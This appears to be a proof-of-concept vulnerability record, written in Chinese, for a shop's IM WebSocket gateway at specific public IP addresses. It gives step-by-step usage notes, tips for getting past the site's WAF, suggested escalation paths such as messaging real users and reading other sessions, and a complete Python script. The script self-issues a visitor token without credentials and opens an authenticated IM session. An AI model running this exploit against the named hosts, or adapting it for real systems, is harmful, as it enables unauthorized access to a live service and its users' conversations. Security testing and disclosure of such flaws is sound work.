# K8 mini IM WebSocket 网关 /mini/imSocket 握手层零鉴权 + 访客 token 免凭据自助签发（任意方可建立 IM 会话）

- **code**: k8-mini-im-websocket-visitor-token-selfissue
- **kind**: poc
- **category**: unauthorized
- **component**: 自研 mini H5 商城/IM 中台（openresty 1.25.3.2 反代 + /mini/* OAuth 与 imSocket）
- **severity**: low
- **language**: python
- **source**: manual
- **verified**: 1
- **verified_note**: task#614，2026-11-05 05:48-05:52 UTC，本机 Windows，Playwright channel=chrome headless（iPhone UA，--ignore-certificate-errors --no-proxy-server 直连）+ CDP Network.webSocket* 事件实测：① GET /mini/oauth/visitor_preauth?sourceDomain= → 200/186B 返回 visitorName/password；② POST /mini/channel/ch/client → 200 返回 chClientId；③ POST /mini/oauth/token（grant_type=password&scope=H5）→ 200 返回 128 字符 access_token、expires_in=3600；④ 页内 new WebSocket(wss://35.220.211.187:32325/mini/imSocket?imToken=<token>&local=zh-CN) → 101 Switching Protocols（Server: openresty/1.25.3.2），收 {"messageType":"CONNECT","data":{"successful":true,"message":"连接成功"}}，发 PING 回 {"messageType":"PONG"}。对照成立：随机 token 同样 101 但应用层回「认证失败,请刷新重试」，无 token 则 101 后 1006 无帧——证明握手层零鉴权、认证下推 CONNECT 帧。跨主机复核：同一 token 在 https://35.241.95.15:32325 握手同样 101 + CONNECT 成功 + PONG，且该请求 Cookie=None，说明 imSocket 不在 /mini/* 的 34B 有状态 WAF 门后、两 IP 共享同一 IM 集群。影响边界：仅发 1 帧 PING，未发消息/未遍历会话/未读他人数据，故 low。
- **tags**: websocket,im,unauthorized,visitor-token,oauth,openresty,handshake,no-auth,waf-bypass,mini,h5
- **created_at**: 2026-11-04T21:55:05.008Z
- **engine**: https://35.220.211.187:32325（同族 https://35.241.95.15:32325）
- **found_by**: vuln-scan

## 描述

自研 H5 商城同款 /mini/* 体系里，IM 长连网关 wss://<host>:32325/mini/imSocket 的 **WebSocket 握手层不做任何鉴权**：无 token、随机 token、有效 token 一律 101 Switching Protocols，真正的认证被下推到应用层 CONNECT 帧。而 imToken 所需的 access_token 可由 `/mini/oauth/visitor_preauth?sourceDomain=`（空 sourceDomain、无任何凭据）自助签发访客账号，再经 `/mini/channel/ch/client` 取 chClientId、`/mini/oauth/token` 换 128 字符 Bearer 得到。合起来即「任意无账号方可进入 IM 消息面」。附带两个可复用的环境结论：(1) /mini/imSocket 不在 /mini/* 的 34B 有状态 WAF 门后面，握手请求完全不带 Cookie 也放行；(2) 该 token 跨同族多台前端 IP 有效，说明后端是同一 IM 集群。

## 用法

```
【前置】真实浏览器 UA（iPhone Safari 串）、直连不走代理（requests trust_env=False / curl --noproxy '*'）、忽略自签证书；先备好 Cookie `magic_string=<32hex>`——该值取自 `/mini/index.html` 静态页响应头同名值，页面会自动跳到 `/mini/h5.html?dm=`。应用自身 axios 请求额外带 `requeststarttime` / `Origin` / `Accept: application/json`，缺这些头会吃到 403 或 34B 的 WAF 页。

【四步取 token → 建 IM 会话】
1) GET `/mini/oauth/visitor_preauth?sourceDomain=`（Host 用 IP:端口，带 magic_string）→ 200，`data.visitorName=V<19位数字>`、`data.password=<12位明文>`。这一步是设计内访客流程，但它是后续 IM 会话的唯一凭据种子。
2) POST `/mini/channel/ch/client`（空 JSON 体）→ 200，`data.chClientId=<uuid>`；首次可能 403/34B（WAF 计分），同一 Session 内重发即 200。
3) POST `/mini/oauth/token`，`Content-Type: application/x-www-form-urlencoded`，体 `grant_type=password&username=<visitorName>&password=<password>&client_id=<chClientId>&scope=H5` → 200，`data.access_token`（128 字符）、refresh_token、expires_in=3600。
4) 页内 `new WebSocket("wss://<host>:32325/mini/imSocket?imToken=<access_token>&local=zh-CN")`，带 `Origin: https://<host>:32325` → **101 Switching Protocols（Server: openresty/1.25.3.2）**，随即收到 `{"messageType":"CONNECT","data":{"successful":true,"message":"连接成功"}}`；发 `{"data":{},"messageType":"PING"}` 回 `{"messageType":"PONG","data":{}}`。

【判据（必须做对照，否则分不清是握手放行还是应用层放行）】
· 有效 token → 101 + CONNECT successful:true + PONG = 进入 IM 消息面；
· 随机 token（如 `imToken=artexNNNNprobe`）→ 仍 101，但应用层回 `{"messageType":"CONNECT","data":{"successful":false,"message":"认证失败,请刷新重试"}}`；
· 完全不带 imToken → 仍 101，随后 1006 关闭、无任何帧。
→ 三种形态同为 101 才说明「握手层零鉴权、认证全在 CONNECT 帧」。

【失败时的常见原因】
· 拿到 403 / 响应体只有 34B 的拦截页：/mini/* 前面有有状态 WAF，必须带上面那套应用头并在同一会话内重发；换成 /mini/imSocket 这条 WS 路径反而不受该门限制（无 Cookie 也 101）。
· 握手拿到 101 但没有 CONNECT 帧：先看是否漏了 token 的 `imToken` 参数名或 `local=zh-CN`，再看应用层回帧是不是「认证失败」。
· 代理导致 wss 建连失败/空响应：强制直连（curl --noproxy '*'；python 里 trust_env=False 且不要设置 http_proxy）。

【影响边界与升级路径】本条只发 1 帧 PING，未向真实用户发消息、未遍历会话、未读他人消息，故定 low。要升级定级必须先验证：访客身份能否向真实用户/客服发消息、消息里是否带可枚举的会话/用户标识、能否跨会话读历史。另注意握手层放行不代表消息面放行，don't confuse the two.

【附：按已验证请求逐字段还原的复现脚本】依赖 `pip install requests websocket-client`；脚本本身未单独重跑，字段与顺序与已验证会话一致。

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""mini IM: visitor token 免凭据自助签发 -> WebSocket 101 -> CONNECT/PONG"""
import json, ssl, time, sys
import requests, websocket

HOST, PORT = "35.220.211.187", 32325      # 同族可换 35.241.95.15
BASE = f"https://{HOST}:{PORT}"
UA = ("Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) "
      "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1")

def app_headers(referer):
    return {
        "User-Agent": UA,
        "X-Channel-Code": "CH_A02_01",
        "X-Merchant-Code": "A02",
        "X-Login-Type": "CUSTOMER",
        "X-Forwarded-Host": f"{HOST}:{PORT}",
        "Origin": BASE,
        "Accept": "application/json",
        "Referer": referer,
        "requeststarttime": str(int(time.time() * 1000)),
    }

s = requests.Session()
s.trust_env = False                      # 关键：别走本机代理
s.verify = False                         # 自签证书
requests.packages.urllib3.disable_warnings()

# 0) 取 magic_string（静态页响应头），并随之进入 h5
r = s.get(f"{BASE}/mini/index.html?dm=", headers=app_headers(f"{BASE}/mini/h5.html?dm="), timeout=20)
ms = r.headers.get("magic_string")
if ms:
    s.cookies.set("magic_string", ms, domain=HOST, path="/")
REF = f"{BASE}/mini/h5.html?dm="
h = app_headers(REF)

def call(method, path, **kw):
    """WAF 有状态：首次 403/34B 时同会话重发一次"""
    for attempt in (1, 2):
        r = s.request(method, BASE + path, headers=h, timeout=20, **kw)
        if r.status_code == 200 and len(r.content) > 40:
            return r
        time.sleep(3)
    return r

# 1) 免凭据签访客账号
r = call("GET", "/mini/oauth/visitor_preauth?sourceDomain=")
v = r.json()["data"]; vis_user, vis_pwd = v["visitorName"], v["password"]
print("[1] visitor", vis_user, "password", "***")

# 2) 取 OAuth client
r = call("POST", "/mini/channel/ch/client", json={})
cid = r.json()["data"]["chClientId"]
print("[2] chClientId", cid)

# 3) 换 access_token
r = call("POST", "/mini/oauth/token",
         data={"grant_type": "password", "username": vis_user, "password": vis_pwd,
               "client_id": cid, "scope": "H5"},
         headers=dict(h, **{"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}))
tok = r.json()["data"]["access_token"]
print("[3] access_token len", len(tok))

# 4) 建 IM 会话
def probe(imtoken):
    url = f"wss://{HOST}:{PORT}/mini/imSocket?imToken={imtoken}&local=zh-CN"
    ws = websocket.create_connection(url, timeout=15, suppress_origin=True,
                                     sslopt={"cert_reqs": ssl.CERT_NONE, "check_hostname": False},
                                     header=[f"Origin: {BASE}", f"User-Agent: {UA}"])
    first = json.loads(ws.recv())
    ws.send(json.dumps({"data": {}, "messageType": "PING"}))
    second = json.loads(ws.recv())
    ws.close()
    return first, second

first, second = probe(tok)
print("[4] valid   :", first)
print("    after PING:", second)
assert first["data"].get("successful") is True and second.get("messageType") == "PONG"

print("[ctl] random:", probe("artex" + str(int(time.time())))[0])   # 期望 successful=false「认证失败」

```
